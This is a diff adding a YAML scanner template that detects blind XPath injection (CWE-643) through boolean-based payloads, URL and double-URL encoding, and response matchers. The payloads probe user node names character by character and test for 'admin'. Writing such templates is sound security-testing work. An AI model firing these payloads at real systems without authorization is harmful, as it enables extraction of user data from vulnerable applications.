@@ -1,0 +1,38 @@
+# templates/xpath-injection/xpath-injection-blind.yaml
+id: xpath-injection-blind
+info:
+  name: Blind XPath Injection Detection
+  author: webx-elite
+  severity: high
+  description: Tests for blind XPath injection using boolean-based techniques
+  tags:
+    - xpath-injection
+    - blind
+    - boolean-based
+  classification:
+    cwe-id: CWE-643
+
+vulnerability_type: xpath-injection
+
+request:
+  - method: GET
+    path: "{{BaseURL}}?{{parameter}}={{blind_xpath_payload}}"
+    
+    matchers:
+      - type: dsl
+        dsl:
+          - "contains(body, 'success') || contains(body, 'found') || contains(body, 'result')"
+          - "status_code == 200"
+        condition: and
+
+payloads:
+  # Boolean-based blind injection
+  - "1' and count(//*)>0 and '1'='1"
+  - "1' and count(//user)>0 and '1'='1"
+  - "1' and string-length(//user[1]/name)>0 and '1'='1"
+  - "1' and substring(//user[1]/name,1,1)='a' and '1'='1"
+  - "1' and contains(//user[1]/name,'admin') and '1'='1"
+
+encoders:
+  - url
+  - double_url
